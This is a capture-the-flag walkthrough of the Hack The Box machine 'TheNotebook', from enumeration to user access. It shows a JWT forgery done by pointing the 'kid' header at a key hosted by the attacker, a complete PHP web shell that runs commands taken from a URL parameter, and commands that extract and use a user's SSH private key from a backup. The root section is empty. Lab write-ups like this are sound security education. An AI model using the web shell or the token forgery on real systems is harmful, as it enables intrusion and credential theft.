# The NoteBook @ Hackthebox

![image](https://user-images.githubusercontent.com/5285547/127499612-feb4ebdf-63f1-4899-b91f-14c7d161d146.png)

Link: https://app.hackthebox.eu/machines/TheNotebook

## Enumeration

### Nmap

```
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
1234/tcp  open     hotline
10010/tcp filtered rxapi

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: B2F904D3046B07D05F90FB6131602ED2
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
1234/tcp  open     http    SimpleHTTPServer 0.6 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
|_http-title: Directory listing for /
10010/tcp filtered rxapi
```

## Port 80

Let's check out this Note Keeper application from the nmap scan. 

![image](https://user-images.githubusercontent.com/5285547/127500008-0f75dbcf-22ac-429d-8fa7-1a0f7a1a892e.png)

Looks like a simple enough application, lets Register an account and enter the main app. 
I choose to register up as admin to see if an account existed first. 

Details
```
username: admin
password: admin
email: a@a.com
```

![image](https://user-images.githubusercontent.com/5285547/127500224-1fd6eed9-16fa-468c-93df-cde6e7e5bd18.png)

So I tried the old add a space to the admin name trick, surprisingly this worked. 

```
'admin '  # note the space after admin
```

Now logged in as user "admin " I can access notes and make a new note. 

![image](https://user-images.githubusercontent.com/5285547/127500550-21482f2b-035a-49cd-916e-6fd87c9a9e7a.png)

![image](https://user-images.githubusercontent.com/5285547/127500583-09d0c62f-1eda-48ca-b6f6-febffeddd1af.png)


I tested for vulnerabilities like xss, ssrf, crsf but didn't found anything.  
So I opened up Burp suite to check the login and auth responses. 
There I found what looked like a JWT token. 

## Jwt token (RS256)

![image](https://user-images.githubusercontent.com/5285547/127500957-9512cd21-9106-467f-a140-3c4c7aa75235.png)

Opening the token in jwt.io I can see the tokens details. 

![image](https://user-images.githubusercontent.com/5285547/127507282-88faa774-8e99-4a85-bfaa-1e4816843474.png)

Seeing the "privKey.key" and "RS265" I knew this was vunerable as we should be able to use our own  
certificate to authenticate the jwt token. 

Info: 
The algorithm RS256 uses the private key to sign the message and uses the public key for authentication

Let's generate a new private.key and use that to sign our jwt token with changed details.  
Doing so without the signing of the token will invalidate it. 

- Steps: 
  1. Generate a new private key
  ```
  openssl genrsa -out example.key 4096
  ```

  2. Start a web server in the directory with the example.key file in. 
  ```
  python3 -m http.server 80
  ```

  3. Change the values in the token. 

  ```
  change the "kid" value to your hosted file
  change the username to "admin" (without the space now)
  change the "admin_cap" to 1
  Add the example.key to the "private" field on jwt.io
  ```

  ![image](https://user-images.githubusercontent.com/5285547/127506901-2b9fc01a-9856-487a-ad51-1be068ef7152.png)

  4. Take the new token and reaplce it for the token on the webpage (cookies) 

  ![image](https://user-images.githubusercontent.com/5285547/127503185-0131b6b5-1410-4f06-8e88-2c6f488fff57.png)

   Now refresh the page to become the real admin and check out the new notes. 

  ![image](https://user-images.githubusercontent.com/5285547/127507069-16871b30-886d-429f-85c6-f6b095b25412.png)



One of the notes suggests that PHP can be executed and now we have access to upload files,  
let's try for a reverse shell. 

Upload a basic shell first. 

shell_web.php
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
![image](https://user-images.githubusercontent.com/5285547/127510079-39ebfe5a-4cac-4a44-bdf4-9ba296077934.png)

Uploading this and then viewing the file, we can now execute commands. 
Then move onto a better shell. 

![image](https://user-images.githubusercontent.com/5285547/127510331-a1fa62dc-551b-4f15-b38d-4d6f63e2b8c4.png)


## User

Looking around the system, I find a strange backup in the /var/backups folder

```
home.tar.gz
```

I copy it to the /tmp directory and have a look inside to find an ssh key for noah the user on the box. 

```
cp /home.tar.gz /tmp
cd /tmp
gunzip home.tar.gz
tar -xvf home.tar
cd home/noah/.ssh
cat id_rsa
```

Using the id_rsa key we can login as noah

```
nano noah_id_rsa
#Paste in the id_rsa you got
#close and save file

chmod 600 noah_id_rsa
ssh -i noah_id_rsa noah@10.10.10.230
```

![image](https://user-images.githubusercontent.com/5285547/127514317-703f435b-7c36-4f02-9e83-5af12cab84a8.png)

Then go ahead and get the user.txt flag! 

## Root






Credits: https://www.freecodecamp.org/news/openssl-command-cheatsheet-b441be1e8c4a/



